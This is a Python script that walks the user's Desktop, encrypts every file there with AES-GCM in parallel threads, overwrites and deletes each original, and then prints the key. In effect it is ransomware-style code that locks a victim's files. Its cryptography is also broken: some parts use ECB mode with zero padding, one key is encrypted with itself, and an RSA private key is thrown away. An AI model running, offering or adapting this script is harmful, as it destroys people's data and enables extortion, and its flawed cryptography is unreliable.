import os
import secrets
import mimetypes
import threading
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key, load_pem_private_key
from cryptography.hazmat.primitives import serialization

def generate_key():
    # Generate a random 32-byte (256-bit) key
    return secrets.token_bytes(32)

def derive_key(password, salt):
    # Derive a key from a password using PBKDF2
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        iterations=100000,  # Adjust this based on your security requirements
        length=32,
        salt=salt,
        backend=default_backend()
    )
    return kdf.derive(password)

def encrypt_file(key, file_path):
    # Generate a random IV (Initialization Vector)
    iv = os.urandom(16)

    # Create an AES-GCM cipher with the provided key and IV
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    chunk_size = 16 * 1024  # Process the file in 16KB chunks
    ciphertext = b''

    # Read the file in chunks and encrypt each chunk
    with open(file_path, 'rb') as file:
        while chunk := file.read(chunk_size):
            ciphertext += encryptor.update(chunk)

    # Finalize the encryption
    ciphertext += encryptor.finalize()

    # Save the encrypted content along with the IV and the authentication tag
    encrypted_file_path = file_path + '.enc'
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(iv + encryptor.tag + ciphertext)

    # Securely delete the original file
    secure_file_delete(file_path)

def secure_file_delete(file_path):
    # Securely delete a file by overwriting it with random data
    with open(file_path, 'rb+') as file:
        file.write(os.urandom(os.path.getsize(file_path)))
        os.remove(file_path)

def encrypt_data(key, data):
    # Generate a Fernet key for symmetric encryption
    fernet_key = generate_key()

    # Pad the data to be a multiple of the block size
    block_size = algorithms.AES.block_size // 8
    data = data + b'\0' * (block_size - len(data) % block_size)

    # Encrypt the data using Fernet
    cipher = Cipher(algorithms.AES(fernet_key), modes.ECB(), backend=default_backend()).encryptor()
    encrypted_data = cipher.update(data) + cipher.finalize()

    # Encrypt the Fernet key using RSA public key
    public_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    ).public_key()

    encrypted_key = public_key.encrypt(
        fernet_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    return encrypted_key + encrypted_data

def save_key(key, key_path):
    # Save a key securely using Fernet for serialization
    with open(key_path, 'wb') as key_file:
        key_file.write(encrypt_key(key, key))

def encrypt_key(master_key, key_to_encrypt):
    # Encrypt a key using the master key
    cipher = Cipher(algorithms.AES(master_key), modes.ECB(), backend=default_backend()).encryptor()
    encrypted_key = cipher.update(key_to_encrypt) + cipher.finalize()
    return encrypted_key

def decrypt_key(master_key, encrypted_key):
    # Decrypt a key using the master key
    cipher = Cipher(algorithms.AES(master_key), modes.ECB(), backend=default_backend()).decryptor()
    decrypted_key = cipher.update(encrypted_key) + cipher.finalize()
    return decrypted_key

def encrypt_all_data(key, data_source):
    # Encrypt all data from a given data source (e.g., a directory) using multi-threading
    threads = []
    for root, dirs, files in os.walk(data_source):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            thread = threading.Thread(target=encrypt_file, args=(key, file_path))
            thread.start()
            threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

def display_decryption_key(key):
    # Display the decryption key on the user's screen
    print("\nDecryption Key:")
    print(key.hex())
    print("\nIMPORTANT: Save this key securely for future decryption!")

def main():
    # Use the user's home directory
    home_directory = os.path.expanduser("~")

    # Determine the desktop path in a platform-independent way
    desktop_path = os.path.join(home_directory, "Desktop")

    # Generate a random password for key derivation
    password = secrets.token_bytes(32)
    salt = os.urandom(16)

    # Derive a key from the password
    key = derive_key(password, salt)

    # Store the key securely using Fernet for serialization
    encrypted_key_path = 'encrypted_key.bin'
    save_key(key, encrypted_key_path)

    # Encrypt all files on the Desktop
    encrypt_all_data(key, desktop_path)

    # Encrypt some sample data
    sample_data = b"This is some sample data to be encrypted."
    encrypted_data = encrypt_data(key, sample_data)

    # Save the encrypted data to a file or a secure location
    with open('encrypted_data.bin', 'wb') as encrypted_data_file:
        encrypted_data_file.write(encrypted_data)

    # Display the decryption key to the user
    display_decryption_key(key)

if __name__ == "__main__":
    main()
